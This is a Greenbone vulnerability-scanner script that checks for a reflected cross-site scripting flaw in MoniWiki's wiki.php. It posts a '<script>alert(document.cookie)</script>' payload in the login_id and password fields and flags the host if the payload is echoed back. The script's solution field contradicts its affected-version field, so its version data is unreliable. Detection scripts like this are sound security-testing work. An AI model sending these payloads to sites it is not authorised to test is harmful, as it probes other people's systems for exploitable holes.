# Copyright (C) 2012 Greenbone Networks GmbH
# Some text descriptions might be excerpted from (a) referenced
# source(s), and are Copyright (C) by the respective right holder(s).
#
# SPDX-License-Identifier: GPL-2.0-or-later
#
# This program is free software; you can redistribute it and/or
# modify it under the terms of the GNU General Public License
# as published by the Free Software Foundation; either version 2
# of the License, or (at your option) any later version.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.902794");
  script_version("2022-02-15T13:40:32+0000");
  script_tag(name:"cvss_base", value:"4.3");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:M/Au:N/C:N/I:P/A:N");
  script_tag(name:"last_modification", value:"2022-02-15 13:40:32 +0000 (Tue, 15 Feb 2022)");
  script_tag(name:"creation_date", value:"2012-02-21 17:36:32 +0530 (Tue, 21 Feb 2012)");
  script_name("MoniWiki 'login_id' Cross-Site Scripting Vulnerability");

  script_xref(name:"URL", value:"http://secunia.com/advisories/48109");
  script_xref(name:"URL", value:"http://xforce.iss.net/xforce/xfdb/17835");
  script_xref(name:"URL", value:"http://www.securelist.com/en/advisories/48109");
  script_xref(name:"URL", value:"http://packetstormsecurity.org/files/109902/moniwiki-xss.txt");

  script_category(ACT_ATTACK);
  script_copyright("Copyright (C) 2012 Greenbone Networks GmbH");
  script_family("Web application abuses");
  script_dependencies("find_service.nasl", "no404.nasl", "webmirror.nasl", "DDI_Directory_Scanner.nasl", "global_settings.nasl");
  script_require_ports("Services/www", 80);
  script_exclude_keys("Settings/disable_cgi_scanning");

  script_tag(name:"impact", value:"Successful exploitation will allow attacker to execute arbitrary
  HTML and script code in a user's browser session in context of an affected site.");

  script_tag(name:"affected", value:"MoniWiki version 1.1.5 and prior.");

  script_tag(name:"insight", value:"The flaw is due to an input passed to the 'login_id' POST
  parameter in 'wiki.php' (when 'action' is set to 'userform') is not properly
  sanitised before being returned to the user.");

  script_tag(name:"solution", value:"Upgrade to MoniWiki 1.0.9 or later.");

  script_tag(name:"summary", value:"MoniWiki is prone to a cross-site scripting (XSS) vulnerability.");

  script_tag(name:"solution_type", value:"VendorFix");
  script_tag(name:"qod_type", value:"remote_app");

  script_xref(name:"URL", value:"http://moniwiki.kldp.net/wiki.php");
  exit(0);
}

include("http_func.inc");
include("http_keepalive.inc");
include("port_service_func.inc");
include("list_array_func.inc");

port = http_get_port(default:80);

if(!http_can_host_php(port:port))
  exit(0);

useragent = http_get_user_agent();
host = http_host_name(port:port);

foreach dir (make_list_unique("/moniwiki", "/MoniWiki", http_cgi_dirs(port:port)))
{

  if(dir == "/") dir = "";

  rcvRes = http_get_cache(item:string(dir, "/wiki.php"), port:port);

  if(rcvRes && "powered by MoniWiki" >< rcvRes)
  {
    postdata = "action=userform&login_id=<script>alert(document.cookie)" +
               "</script>&password=<script>alert(document.cookie)</script>";

    monReq = string("POST ", dir, "/wiki.php/FrontPage HTTP/1.1\r\n",
                    "Host: ", host, "\r\n",
                    "User-Agent: ", useragent, "\r\n",
                    "Content-Type: application/x-www-form-urlencoded\r\n",
                    "Content-Length: ", strlen(postdata), "\r\n",
                    "\r\n", postdata);
    monRes = http_keepalive_send_recv(port:port, data:monReq);

    if(monRes =~ "^HTTP/1\.[01] 200" && "<script>alert(document.cookie)</script>" >< monRes)
    {
      security_message(port:port);
      exit(0);
    }
  }
}

exit(99);
